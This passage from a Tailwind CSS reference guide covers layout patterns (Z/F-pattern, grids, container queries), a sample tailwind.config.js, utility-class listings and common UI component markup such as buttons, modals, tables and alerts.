  <div class="isolate relative z-10 bg-white p-4">
    <div class="relative z-50 bg-blue-500">High z-index within isolated context</div>
    <div class="relative z-10 bg-red-500">Lower within same context</div>
  </div>
  <div class="relative z-20 bg-green-500">
    This z-20 doesn't compete with isolated z-50 above
  </div>
</div>

<!-- Isolate complex components -->
<div class="isolate">
  <!-- Component with complex internal z-index hierarchy -->
  <div class="modal">
    <div class="relative z-10">Modal backdrop</div>
    <div class="relative z-20">Modal content</div>
  </div>
</div>
```

### 10. Visual Flow Patterns for Layout

Understanding how users scan content helps create effective layouts.

**Z-Pattern Layout:**
```html
<!-- Users scan: top-left → top-right → middle-left → bottom-right -->
<div class="container mx-auto p-8">
  <!-- Top bar: Logo left, CTA right -->
  <header class="flex items-center justify-between mb-8">
    <img src="logo.svg" alt="Logo" class="h-8">
    <button class="bg-blue-500 text-white px-6 py-2 rounded-lg">Sign Up</button>
  </header>

  <!-- Hero: Image left, content right -->
  <section class="grid md:grid-cols-2 gap-8 items-center mb-16">
    <img src="hero.jpg" alt="Hero" class="rounded-lg">
    <div>
      <h1 class="text-4xl font-bold mb-4">Main Headline</h1>
      <p class="text-gray-600 mb-4">Supporting text...</p>
      <button class="bg-blue-500 text-white px-6 py-2 rounded-lg">Learn More</button>
    </div>
  </section>

  <!-- Footer: centered CTA -->
  <footer class="text-center">
    <button class="bg-green-500 text-white px-8 py-3 rounded-lg text-lg">
      Get Started Now
    </button>
  </footer>
</div>
```

**F-Pattern Layout:**
```html
<!-- Users scan: horizontal top, horizontal middle, vertical left -->
<!-- Best for text-heavy content like blogs or articles -->
<article class="max-w-4xl mx-auto p-8">
  <!-- Top horizontal bar (heading, meta) -->
  <header class="mb-8">
    <h1 class="text-4xl font-bold mb-2">Article Headline Captures Attention</h1>
    <div class="text-gray-600 text-sm">
      By Author Name • Published Jan 15, 2025 • 5 min read
    </div>
  </header>

  <!-- Featured image (full width) -->
  <img src="featured.jpg" alt="Featured" class="w-full rounded-lg mb-8">

  <!-- Content with strong left alignment -->
  <div class="prose prose-lg">
    <p class="mb-4">
      <strong class="text-xl">First paragraph with strong opening.</strong>
      The beginning is crucial for the F-pattern...
    </p>

    <h2 class="text-2xl font-bold mb-4 mt-8">Subheading Draws Eye</h2>
    <p class="mb-4">Secondary content with key points highlighted...</p>

    <ul class="list-disc pl-6 mb-4">
      <li>Bullet points align left</li>
      <li>Easy to scan vertically</li>
      <li>Users follow left edge</li>
    </ul>

    <h2 class="text-2xl font-bold mb-4 mt-8">Another Subheading</h2>
    <p class="mb-4">More content...</p>
  </div>

  <!-- Sidebar with related content (optional) -->
  <aside class="mt-12 p-6 bg-gray-100 rounded-lg">
    <h3 class="font-bold mb-4">Related Articles</h3>
    <ul class="space-y-2">
      <li><a href="#" class="text-blue-600 hover:underline">Related Article 1</a></li>
      <li><a href="#" class="text-blue-600 hover:underline">Related Article 2</a></li>
    </ul>
  </aside>
</article>
```

**White Space Principles:**
```html
<!-- Generous white space improves readability and hierarchy -->
<section class="py-16 px-4">
  <!-- Macro white space: large gaps between sections -->
  <div class="max-w-6xl mx-auto space-y-16">

    <!-- Section 1: Tight content grouping with space around -->
    <div class="text-center space-y-4">
      <h2 class="text-3xl font-bold">Features</h2>
      <p class="text-gray-600 max-w-2xl mx-auto">
        Related content stays close together
      </p>
    </div>

    <!-- Micro white space: consistent gaps within components -->
    <div class="grid md:grid-cols-3 gap-8">
      <div class="bg-white p-6 rounded-lg shadow space-y-3">
        <div class="w-12 h-12 bg-blue-500 rounded-lg mb-4"></div>
        <h3 class="text-xl font-bold">Feature 1</h3>
        <p class="text-gray-600">Description with comfortable line spacing</p>
      </div>

      <div class="bg-white p-6 rounded-lg shadow space-y-3">
        <div class="w-12 h-12 bg-blue-500 rounded-lg mb-4"></div>
        <h3 class="text-xl font-bold">Feature 2</h3>
        <p class="text-gray-600">Consistent spacing creates rhythm</p>
      </div>

      <div class="bg-white p-6 rounded-lg shadow space-y-3">
        <div class="w-12 h-12 bg-blue-500 rounded-lg mb-4"></div>
        <h3 class="text-xl font-bold">Feature 3</h3>
        <p class="text-gray-600">White space guides the eye</p>
      </div>
    </div>
  </div>
</section>

<!-- Dense vs. Spacious comparison -->
<div class="grid md:grid-cols-2 gap-8">
  <!-- Too dense (poor readability) -->
  <div class="bg-gray-100 p-2">
    <h3 class="text-sm font-bold">Dense Layout</h3>
    <p class="text-xs">No breathing room makes content hard to read.</p>
    <button class="text-xs bg-blue-500 text-white px-2 py-1 mt-1">Click</button>
  </div>

  <!-- Well-spaced (better readability) -->
  <div class="bg-white p-6 rounded-lg shadow">
    <h3 class="text-xl font-bold mb-3">Spacious Layout</h3>
    <p class="text-gray-600 mb-4 leading-relaxed">
      Generous white space improves readability and comprehension.
    </p>
    <button class="bg-blue-500 text-white px-4 py-2 rounded-lg">
      Click
    </button>
  </div>
</div>
```

**Grid-Based Layouts with Tailwind:**
```html
<!-- 12-column grid system -->
<div class="grid grid-cols-12 gap-6">
  <!-- Sidebar: 3 columns -->
  <aside class="col-span-12 md:col-span-3 bg-gray-100 p-4 rounded-lg">
    <h3 class="font-bold mb-4">Sidebar</h3>
    <nav class="space-y-2">
      <a href="#" class="block p-2 hover:bg-gray-200 rounded">Link 1</a>
      <a href="#" class="block p-2 hover:bg-gray-200 rounded">Link 2</a>
    </nav>
  </aside>

  <!-- Main content: 9 columns -->
  <main class="col-span-12 md:col-span-9">
    <article class="bg-white p-6 rounded-lg shadow mb-6">
      <h1 class="text-3xl font-bold mb-4">Main Content</h1>
      <p class="text-gray-600">Content spans 9 columns on desktop...</p>
    </article>
  </main>
</div>

<!-- Asymmetric grid for visual interest -->
<div class="grid grid-cols-5 gap-4 h-96">
  <!-- Large feature: 3 columns -->
  <div class="col-span-3 row-span-2 bg-blue-500 rounded-lg overflow-hidden">
    <img src="feature.jpg" class="w-full h-full object-cover" alt="Feature">
  </div>

  <!-- Small items: 2 columns -->
  <div class="col-span-2 bg-gray-200 rounded-lg p-4">
    <h3 class="font-bold">Item 1</h3>
  </div>

  <div class="col-span-2 bg-gray-300 rounded-lg p-4">
    <h3 class="font-bold">Item 2</h3>
  </div>
</div>

<!-- Responsive grid with auto-fit -->
<div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
  <!-- Cards automatically adjust to available space -->
  <div class="bg-white p-6 rounded-lg shadow">Card 1</div>
  <div class="bg-white p-6 rounded-lg shadow">Card 2</div>
  <div class="bg-white p-6 rounded-lg shadow">Card 3</div>
  <div class="bg-white p-6 rounded-lg shadow">Card 4</div>
</div>

<!-- Holy Grail Layout (header, sidebar, content, aside, footer) -->
<div class="min-h-screen grid grid-rows-[auto_1fr_auto]">
  <!-- Header -->
  <header class="bg-white shadow-md p-4">
    <div class="container mx-auto">Header</div>
  </header>

  <!-- Main area with sidebar and content -->
  <div class="grid grid-cols-12 gap-6 container mx-auto p-6">
    <!-- Left sidebar -->
    <aside class="col-span-12 md:col-span-2 bg-gray-100 p-4 rounded-lg">
      Navigation
    </aside>

    <!-- Main content -->
    <main class="col-span-12 md:col-span-7 bg-white p-6 rounded-lg shadow">
      Main Content
    </main>

    <!-- Right sidebar -->
    <aside class="col-span-12 md:col-span-3 bg-gray-100 p-4 rounded-lg">
      Related Info
    </aside>
  </div>

  <!-- Footer -->
  <footer class="bg-gray-800 text-white p-6">
    <div class="container mx-auto">Footer</div>
  </footer>
</div>
```

**Container Queries (Modern Layout Pattern):**
```html
<!-- Component adapts to container size, not viewport -->
<div class="@container">
  <div class="@md:grid @md:grid-cols-2 gap-4">
    <div>Content adapts to parent container width</div>
    <div>Not viewport width</div>
  </div>
</div>

<!-- Responsive card based on container -->
<div class="@container bg-white rounded-lg shadow overflow-hidden">
  <div class="@sm:flex">
    <img src="image.jpg" class="@sm:w-48 @sm:h-48 object-cover" alt="Image">
    <div class="p-4">
      <h3 class="font-bold mb-2">Card Title</h3>
      <p class="text-gray-600">Card adapts layout based on its container size</p>
    </div>
  </div>
</div>
```

## Tailwind CSS

### Configuration
```javascript
// tailwind.config.js
/** @type {import('tailwindcss').Config} */
export default {
  content: [
    './resources/**/*.blade.php',
    './resources/**/*.js',
    './resources/**/*.vue',
  ],
  darkMode: 'class', // or 'media'
  theme: {
    extend: {
      // Custom colors
      colors: {
        primary: {
          50: '#eff6ff',
          100: '#dbeafe',
          200: '#bfdbfe',
          300: '#93c5fd',
          400: '#60a5fa',
          500: '#3b82f6',
          600: '#2563eb',
          700: '#1d4ed8',
          800: '#1e40af',
          900: '#1e3a8a',
          950: '#172554',
        },
        secondary: {
          // ...
        },
      },
      // Custom fonts
      fontFamily: {
        sans: ['Inter var', ...defaultTheme.fontFamily.sans],
        display: ['Lexend', 'sans-serif'],
      },
      // Custom spacing
      spacing: {
        '18': '4.5rem',
        '88': '22rem',
      },
      // Custom breakpoints
      screens: {
        'xs': '475px',
        '3xl': '1920px',
      },
      // Animation
      animation: {
        'fade-in': 'fadeIn 0.3s ease-out',
        'slide-up': 'slideUp 0.3s ease-out',
        'spin-slow': 'spin 3s linear infinite',
      },
      keyframes: {
        fadeIn: {
          '0%': { opacity: '0' },
          '100%': { opacity: '1' },
        },
        slideUp: {
          '0%': { transform: 'translateY(10px)', opacity: '0' },
          '100%': { transform: 'translateY(0)', opacity: '1' },
        },
      },
      // Typography plugin customization
      typography: (theme) => ({
        DEFAULT: {
          css: {
            color: theme('colors.gray.700'),
            a: {
              color: theme('colors.primary.600'),
              '&:hover': {
                color: theme('colors.primary.800'),
              },
            },
          },
        },
      }),
    },
  },
  plugins: [
    require('@tailwindcss/forms'),
    require('@tailwindcss/typography'),
    require('@tailwindcss/aspect-ratio'),
    require('@tailwindcss/container-queries'),
  ],
}
```

### Layout Utilities

#### Flexbox
```html
<!-- Flex containers -->
<div class="flex">...</div>
<div class="inline-flex">...</div>
<div class="flex flex-col">...</div>
<div class="flex flex-row-reverse">...</div>
<div class="flex flex-wrap">...</div>

<!-- Justify content -->
<div class="flex justify-start">...</div>
<div class="flex justify-center">...</div>
<div class="flex justify-end">...</div>
<div class="flex justify-between">...</div>
<div class="flex justify-around">...</div>
<div class="flex justify-evenly">...</div>

<!-- Align items -->
<div class="flex items-start">...</div>
<div class="flex items-center">...</div>
<div class="flex items-end">...</div>
<div class="flex items-baseline">...</div>
<div class="flex items-stretch">...</div>

<!-- Gap -->
<div class="flex gap-4">...</div>
<div class="flex gap-x-4 gap-y-2">...</div>

<!-- Flex items -->
<div class="flex-1">...</div>        <!-- flex: 1 1 0% -->
<div class="flex-auto">...</div>     <!-- flex: 1 1 auto -->
<div class="flex-initial">...</div>  <!-- flex: 0 1 auto -->
<div class="flex-none">...</div>     <!-- flex: none -->
<div class="flex-grow">...</div>
<div class="flex-shrink-0">...</div>
<div class="order-1">...</div>
```

#### Grid
```html
<!-- Grid containers -->
<div class="grid grid-cols-3 gap-4">...</div>
<div class="grid grid-cols-12 gap-6">...</div>

<!-- Responsive grid -->
<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">...</div>

<!-- Auto-fit/auto-fill -->
<div class="grid grid-cols-[repeat(auto-fit,minmax(250px,1fr))] gap-4">...</div>

<!-- Grid rows -->
<div class="grid grid-rows-3 grid-flow-col">...</div>

<!-- Grid span -->
<div class="col-span-2">...</div>
<div class="col-span-full">...</div>
<div class="col-start-2 col-end-4">...</div>
<div class="row-span-2">...</div>

<!-- Place items -->
<div class="grid place-items-center">...</div>
<div class="grid place-content-center">...</div>
```

### Spacing
```html
<!-- Padding -->
<div class="p-4">...</div>           <!-- all sides -->
<div class="px-4 py-2">...</div>     <!-- x and y axis -->
<div class="pt-4 pb-2">...</div>     <!-- top and bottom -->
<div class="pl-4 pr-2">...</div>     <!-- left and right -->
<div class="ps-4 pe-2">...</div>     <!-- start and end (RTL support) -->

<!-- Margin -->
<div class="m-4">...</div>
<div class="mx-auto">...</div>       <!-- center horizontally -->
<div class="my-8">...</div>
<div class="mt-4 mb-8">...</div>
<div class="-mt-4">...</div>         <!-- negative margin -->

<!-- Space between children -->
<div class="space-x-4">...</div>
<div class="space-y-2">...</div>
<div class="space-y-reverse">...</div>
```

### Sizing
```html
<!-- Width -->
<div class="w-full">...</div>        <!-- 100% -->
<div class="w-screen">...</div>      <!-- 100vw -->
<div class="w-1/2">...</div>         <!-- 50% -->
<div class="w-64">...</div>          <!-- 16rem -->
<div class="w-[300px]">...</div>     <!-- arbitrary value -->
<div class="w-fit">...</div>         <!-- fit-content -->
<div class="w-min">...</div>         <!-- min-content -->
<div class="w-max">...</div>         <!-- max-content -->

<!-- Max/Min width -->
<div class="max-w-md">...</div>      <!-- 28rem -->
<div class="max-w-screen-xl">...</div>
<div class="min-w-0">...</div>

<!-- Height -->
<div class="h-full">...</div>
<div class="h-screen">...</div>      <!-- 100vh -->
<div class="h-dvh">...</div>         <!-- 100dvh (dynamic viewport) -->
<div class="min-h-screen">...</div>

<!-- Aspect ratio -->
<div class="aspect-video">...</div>  <!-- 16:9 -->
<div class="aspect-square">...</div> <!-- 1:1 -->
<div class="aspect-[4/3]">...</div>
```

### Typography
```html
<!-- Font size -->
<p class="text-xs">...</p>           <!-- 0.75rem -->
<p class="text-sm">...</p>           <!-- 0.875rem -->
<p class="text-base">...</p>         <!-- 1rem -->
<p class="text-lg">...</p>           <!-- 1.125rem -->
<p class="text-xl">...</p>           <!-- 1.25rem -->
<p class="text-2xl">...</p>          <!-- 1.5rem -->
<p class="text-[22px]">...</p>       <!-- arbitrary -->

<!-- Font weight -->
<p class="font-light">...</p>
<p class="font-normal">...</p>
<p class="font-medium">...</p>
<p class="font-semibold">...</p>
<p class="font-bold">...</p>

<!-- Line height -->
<p class="leading-none">...</p>      <!-- 1 -->
<p class="leading-tight">...</p>     <!-- 1.25 -->
<p class="leading-normal">...</p>    <!-- 1.5 -->
<p class="leading-relaxed">...</p>   <!-- 1.625 -->
<p class="leading-loose">...</p>     <!-- 2 -->

<!-- Letter spacing -->
<p class="tracking-tight">...</p>
<p class="tracking-normal">...</p>
<p class="tracking-wide">...</p>

<!-- Text alignment -->
<p class="text-left">...</p>
<p class="text-center">...</p>
<p class="text-right">...</p>
<p class="text-justify">...</p>

<!-- Text decoration -->
<p class="underline">...</p>
<p class="line-through">...</p>
<p class="no-underline">...</p>
<a class="underline-offset-2 decoration-2 decoration-primary-500">...</a>

<!-- Text transform -->
<p class="uppercase">...</p>
<p class="lowercase">...</p>
<p class="capitalize">...</p>
<p class="normal-case">...</p>

<!-- Text overflow -->
<p class="truncate">...</p>
<p class="text-ellipsis overflow-hidden">...</p>
<p class="line-clamp-3">...</p>

<!-- Text wrapping -->
<p class="whitespace-nowrap">...</p>
<p class="whitespace-pre-line">...</p>
<p class="text-wrap">...</p>
<p class="text-balance">...</p>
<p class="text-pretty">...</p>
```

### Colors
```html
<!-- Text color -->
<p class="text-gray-900">...</p>
<p class="text-primary-600">...</p>
<p class="text-white/80">...</p>     <!-- with opacity -->
<p class="text-[#1a1a1a]">...</p>    <!-- arbitrary -->

<!-- Background -->
<div class="bg-white">...</div>
<div class="bg-gray-100">...</div>
<div class="bg-primary-500/10">...</div>

<!-- Border color -->
<div class="border border-gray-300">...</div>

<!-- Ring (focus outline) -->
<button class="ring-2 ring-primary-500 ring-offset-2">...</button>

<!-- Gradients -->
<div class="bg-gradient-to-r from-cyan-500 to-blue-500">...</div>
<div class="bg-gradient-to-br from-purple-500 via-pink-500 to-red-500">...</div>
```

### Borders
```html
<!-- Border width -->
<div class="border">...</div>        <!-- 1px -->
<div class="border-2">...</div>
<div class="border-t-4">...</div>    <!-- top only -->
<div class="border-x">...</div>      <!-- left + right -->

<!-- Border radius -->
<div class="rounded">...</div>       <!-- 0.25rem -->
<div class="rounded-md">...</div>    <!-- 0.375rem -->
<div class="rounded-lg">...</div>    <!-- 0.5rem -->
<div class="rounded-xl">...</div>    <!-- 0.75rem -->
<div class="rounded-full">...</div>  <!-- 9999px -->
<div class="rounded-t-lg">...</div>  <!-- top corners only -->

<!-- Border style -->
<div class="border-solid">...</div>
<div class="border-dashed">...</div>
<div class="border-dotted">...</div>

<!-- Divide (between children) -->
<div class="divide-y divide-gray-200">
  <div>...</div>
  <div>...</div>
</div>

<!-- Ring -->
<button class="focus:ring-2 focus:ring-offset-2 focus:ring-primary-500">
  ...
</button>
```

### Effects
```html
<!-- Shadows -->
<div class="shadow-sm">...</div>
<div class="shadow">...</div>
<div class="shadow-md">...</div>
<div class="shadow-lg">...</div>
<div class="shadow-xl">...</div>
<div class="shadow-2xl">...</div>
<div class="shadow-inner">...</div>
<div class="shadow-none">...</div>

<!-- Opacity -->
<div class="opacity-50">...</div>
<div class="opacity-0">...</div>

<!-- Blur -->
<div class="blur-sm">...</div>
<div class="blur-md">...</div>
<div class="backdrop-blur-sm">...</div>
<div class="backdrop-blur-md">...</div>

<!-- Brightness/Contrast -->
<img class="brightness-110 contrast-110" />

<!-- Mix blend mode -->
<div class="mix-blend-multiply">...</div>
```

### Transforms
```html
<!-- Scale -->
<div class="scale-95 hover:scale-100">...</div>
<div class="scale-x-110">...</div>

<!-- Rotate -->
<div class="rotate-45">...</div>
<div class="-rotate-12">...</div>

<!-- Translate -->
<div class="translate-x-4">...</div>
<div class="translate-y-1/2">...</div>
<div class="-translate-y-full">...</div>

<!-- Skew -->
<div class="skew-x-6">...</div>

<!-- Transform origin -->
<div class="origin-center">...</div>
<div class="origin-top-left">...</div>
```

### Transitions and Animation
```html
<!-- Transitions -->
<button class="transition">...</button>
<button class="transition-all">...</button>
<button class="transition-colors">...</button>
<button class="transition-transform">...</button>
<button class="transition-opacity">...</button>

<!-- Duration -->
<button class="transition duration-150">...</button>
<button class="transition duration-300">...</button>
<button class="transition duration-500">...</button>

<!-- Timing function -->
<button class="transition ease-in">...</button>
<button class="transition ease-out">...</button>
<button class="transition ease-in-out">...</button>

<!-- Delay -->
<button class="transition delay-150">...</button>

<!-- Animations -->
<div class="animate-spin">...</div>
<div class="animate-ping">...</div>
<div class="animate-pulse">...</div>
<div class="animate-bounce">...</div>
```

### Responsive Design
```html
<!-- Mobile-first breakpoints -->
<div class="w-full md:w-1/2 lg:w-1/3">...</div>
<div class="flex flex-col md:flex-row">...</div>
<div class="text-sm md:text-base lg:text-lg">...</div>
<div class="p-4 md:p-6 lg:p-8">...</div>
<div class="hidden md:block">...</div>
<div class="block md:hidden">...</div>

<!-- Breakpoints:
  sm: 640px
  md: 768px
  lg: 1024px
  xl: 1280px
  2xl: 1536px
-->

<!-- Max-width variants -->
<div class="block max-md:hidden">...</div>

<!-- Range variants -->
<div class="md:max-lg:bg-blue-500">...</div>
```

### State Variants
```html
<!-- Hover -->
<button class="bg-blue-500 hover:bg-blue-600">...</button>

<!-- Focus -->
<input class="focus:outline-none focus:ring-2 focus:ring-blue-500" />
<input class="focus-visible:ring-2" />
<div class="focus-within:ring-2">...</div>

<!-- Active -->
<button class="active:scale-95">...</button>

<!-- Disabled -->
<button class="disabled:opacity-50 disabled:cursor-not-allowed">...</button>

<!-- Group hover -->
<div class="group">
  <span class="group-hover:text-blue-500">...</span>
</div>

<!-- Peer -->
<input class="peer" />
<span class="peer-focus:text-blue-500">...</span>
<span class="peer-invalid:text-red-500">...</span>

<!-- First/Last child -->
<div class="first:pt-0 last:pb-0">...</div>
<div class="odd:bg-gray-50 even:bg-white">...</div>

<!-- Dark mode -->
<div class="bg-white dark:bg-gray-800">...</div>
<p class="text-gray-900 dark:text-gray-100">...</p>

<!-- Print -->
<div class="print:hidden">...</div>

<!-- Motion preferences -->
<div class="motion-safe:animate-bounce">...</div>
<div class="motion-reduce:animate-none">...</div>
```

### Forms (with @tailwindcss/forms)
```html
<!-- Basic inputs -->
<input type="text" class="form-input rounded-md border-gray-300 focus:border-primary-500 focus:ring-primary-500" />
<select class="form-select rounded-md">...</select>
<textarea class="form-textarea rounded-md">...</textarea>
<input type="checkbox" class="form-checkbox rounded text-primary-600" />
<input type="radio" class="form-radio text-primary-600" />

<!-- Custom styled form -->
<input
  type="text"
  class="block w-full rounded-lg border-gray-300 shadow-sm
         focus:border-primary-500 focus:ring-primary-500
         disabled:bg-gray-100 disabled:cursor-not-allowed
         placeholder:text-gray-400"
  placeholder="Enter text..."
/>

<!-- Input with icon -->
<div class="relative">
  <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
    <svg class="h-5 w-5 text-gray-400">...</svg>
  </div>
  <input type="text" class="pl-10 ..." />
</div>

<!-- Input group -->
<div class="flex">
  <span class="inline-flex items-center px-3 rounded-l-md border border-r-0 border-gray-300 bg-gray-50 text-gray-500">
    @
  </span>
  <input type="text" class="flex-1 rounded-none rounded-r-md border-gray-300" />
</div>
```

### Typography Plugin
```html
<!-- Apply prose class to rich text content -->
<article class="prose lg:prose-xl">
  <h1>Title</h1>
  <p>Content with <a href="#">links</a> and <strong>bold</strong> text.</p>
  <ul>
    <li>List item</li>
  </ul>
  <blockquote>Quote</blockquote>
  <pre><code>code</code></pre>
</article>

<!-- Modifiers -->
<article class="prose prose-slate">...</article>
<article class="prose prose-invert">...</article>
<article class="prose prose-sm md:prose-base">...</article>

<!-- Override prose elements -->
<article class="prose prose-headings:text-primary-900 prose-a:text-primary-600">
  ...
</article>
```

### Container Queries
```html
<!-- With @tailwindcss/container-queries -->
<div class="@container">
  <div class="@lg:flex @lg:flex-row flex-col">
    <div class="@lg:w-1/2">...</div>
    <div class="@lg:w-1/2">...</div>
  </div>
</div>

<!-- Named containers -->
<div class="@container/main">
  <div class="@lg/main:grid-cols-2">...</div>
</div>
```

## Common Component Patterns

### Button
```html
<!-- Primary button -->
<button class="inline-flex items-center justify-center gap-2 px-4 py-2
               text-sm font-medium text-white bg-primary-600
               rounded-lg shadow-sm
               hover:bg-primary-700
               focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary-500
               disabled:opacity-50 disabled:cursor-not-allowed
               transition-colors">
  <svg class="w-4 h-4">...</svg>
  Button
</button>

<!-- Secondary button -->
<button class="px-4 py-2 text-sm font-medium text-gray-700 bg-white
               border border-gray-300 rounded-lg shadow-sm
               hover:bg-gray-50
               focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary-500">
  Secondary
</button>

<!-- Ghost button -->
<button class="px-4 py-2 text-sm font-medium text-gray-700
               rounded-lg hover:bg-gray-100
               focus:outline-none focus:ring-2 focus:ring-primary-500">
  Ghost
</button>

<!-- Icon button -->
<button class="p-2 text-gray-500 rounded-lg hover:bg-gray-100
               focus:outline-none focus:ring-2 focus:ring-primary-500">
  <svg class="w-5 h-5">...</svg>
</button>
```

### Card
```html
<div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
  <img src="..." class="w-full h-48 object-cover" alt="" />
  <div class="p-6">
    <h3 class="text-lg font-semibold text-gray-900">Card Title</h3>
    <p class="mt-2 text-sm text-gray-600">
      Card description goes here.
    </p>
    <div class="mt-4 flex items-center gap-4">
      <button class="text-primary-600 text-sm font-medium hover:text-primary-700">
        Learn more →
      </button>
    </div>
  </div>
</div>
```

### Modal/Dialog
```html
<!-- Backdrop -->
<div class="fixed inset-0 bg-black/50 backdrop-blur-sm z-40"></div>

<!-- Modal -->
<div class="fixed inset-0 z-50 flex items-center justify-center p-4">
  <div class="bg-white rounded-xl shadow-xl max-w-md w-full max-h-[90vh] overflow-auto">
    <!-- Header -->
    <div class="flex items-center justify-between p-4 border-b">
      <h2 class="text-lg font-semibold">Modal Title</h2>
      <button class="p-1 rounded-lg hover:bg-gray-100">
        <svg class="w-5 h-5">...</svg>
      </button>
    </div>

    <!-- Content -->
    <div class="p-4">
      <p>Modal content...</p>
    </div>

    <!-- Footer -->
    <div class="flex justify-end gap-3 p-4 border-t bg-gray-50">
      <button class="px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-100 rounded-lg">
        Cancel
      </button>
      <button class="px-4 py-2 text-sm font-medium text-white bg-primary-600 hover:bg-primary-700 rounded-lg">
        Confirm
      </button>
    </div>
  </div>
</div>
```

### Dropdown Menu
```html
<div class="relative">
  <button class="flex items-center gap-2 px-3 py-2 text-sm font-medium text-gray-700 hover:bg-gray-100 rounded-lg">
    Menu
    <svg class="w-4 h-4">...</svg>
  </button>

  <!-- Dropdown -->
  <div class="absolute right-0 mt-2 w-56 bg-white rounded-lg shadow-lg border border-gray-100 py-1 z-10">
    <a href="#" class="flex items-center gap-3 px-4 py-2 text-sm text-gray-700 hover:bg-gray-50">
      <svg class="w-4 h-4 text-gray-400">...</svg>
      Option 1
    </a>
    <a href="#" class="flex items-center gap-3 px-4 py-2 text-sm text-gray-700 hover:bg-gray-50">
      <svg class="w-4 h-4 text-gray-400">...</svg>
      Option 2
    </a>
    <div class="border-t border-gray-100 my-1"></div>
    <a href="#" class="flex items-center gap-3 px-4 py-2 text-sm text-red-600 hover:bg-red-50">
      <svg class="w-4 h-4">...</svg>
      Delete
    </a>
  </div>
</div>
```

### Navigation
```html
<nav class="bg-white border-b border-gray-100">
  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
    <div class="flex items-center justify-between h-16">
      <!-- Logo -->
      <div class="flex-shrink-0">
        <img src="..." class="h-8 w-auto" alt="Logo" />
      </div>

      <!-- Desktop nav -->
      <div class="hidden md:flex items-center gap-8">
        <a href="#" class="text-sm font-medium text-gray-900 hover:text-primary-600">
          Home
        </a>
        <a href="#" class="text-sm font-medium text-gray-500 hover:text-gray-900">
          Features
        </a>
        <a href="#" class="text-sm font-medium text-gray-500 hover:text-gray-900">
          Pricing
        </a>
      </div>

      <!-- Mobile menu button -->
      <button class="md:hidden p-2 rounded-lg hover:bg-gray-100">
        <svg class="w-6 h-6">...</svg>
      </button>
    </div>
  </div>
</nav>
```

### Alert/Notice
```html
<!-- Success -->
<div class="flex items-start gap-3 p-4 bg-green-50 border border-green-200 rounded-lg">
  <svg class="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5">...</svg>
  <div>
    <h4 class="text-sm font-medium text-green-800">Success</h4>
    <p class="mt-1 text-sm text-green-700">Your changes have been saved.</p>
  </div>
</div>

<!-- Error -->
<div class="flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-lg">
  <svg class="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5">...</svg>
  <div>
    <h4 class="text-sm font-medium text-red-800">Error</h4>
    <p class="mt-1 text-sm text-red-700">Something went wrong.</p>
  </div>
</div>

<!-- Warning -->
<div class="flex items-start gap-3 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
  <svg class="w-5 h-5 text-yellow-500 flex-shrink-0 mt-0.5">...</svg>
  <div>
    <h4 class="text-sm font-medium text-yellow-800">Warning</h4>
    <p class="mt-1 text-sm text-yellow-700">Please review before continuing.</p>
  </div>
</div>

<!-- Info -->
<div class="flex items-start gap-3 p-4 bg-blue-50 border border-blue-200 rounded-lg">
  <svg class="w-5 h-5 text-blue-500 flex-shrink-0 mt-0.5">...</svg>
  <div>
    <h4 class="text-sm font-medium text-blue-800">Info</h4>
    <p class="mt-1 text-sm text-blue-700">Here's some helpful information.</p>
  </div>
</div>
```

### Badge/Tag
```html
<!-- Status badges -->
<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
  Active
</span>
<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-yellow-100 text-yellow-800">
  Pending
</span>
<span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-red-100 text-red-800">
  Inactive
</span>

<!-- With dot indicator -->
<span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-100 text-gray-800">
  <span class="w-1.5 h-1.5 rounded-full bg-green-500"></span>
  Online
</span>

<!-- Removable tag -->
<span class="inline-flex items-center gap-1 pl-2.5 pr-1 py-0.5 rounded-full text-xs font-medium bg-primary-100 text-primary-700">
  Tag
  <button class="p-0.5 rounded-full hover:bg-primary-200">
    <svg class="w-3 h-3">...</svg>
  </button>
</span>
```

### Table
```html
<div class="overflow-x-auto">
  <table class="min-w-full divide-y divide-gray-200">
    <thead class="bg-gray-50">
      <tr>
        <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
          Name
        </th>
        <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
          Status
        </th>
        <th scope="col" class="px-6 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
          Actions
        </th>
      </tr>
    </thead>
    <tbody class="bg-white divide-y divide-gray-200">
      <tr class="hover:bg-gray-50">
        <td class="px-6 py-4 whitespace-nowrap">
          <div class="flex items-center">
            <img class="h-10 w-10 rounded-full" src="..." alt="" />
            <div class="ml-4">
              <div class="text-sm font-medium text-gray-900">John Doe</div>
              <div class="text-sm text-gray-500">john@example.com</div>
            </div>
          </div>
        </td>
        <td class="px-6 py-4 whitespace-nowrap">
          <span class="px-2 py-1 text-xs rounded-full bg-green-100 text-green-800">
            Active
          </span>
        </td>
        <td class="px-6 py-4 whitespace-nowrap text-right text-sm">
          <button class="text-primary-600 hover:text-primary-900">Edit</button>
        </td>
      </tr>
    </tbody>
  </table>
</div>
```

### Loading States
```html
<!-- Spinner -->
<svg class="animate-spin h-5 w-5 text-primary-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
  <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
  <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
</svg>

<!-- Skeleton -->
<div class="animate-pulse space-y-4">
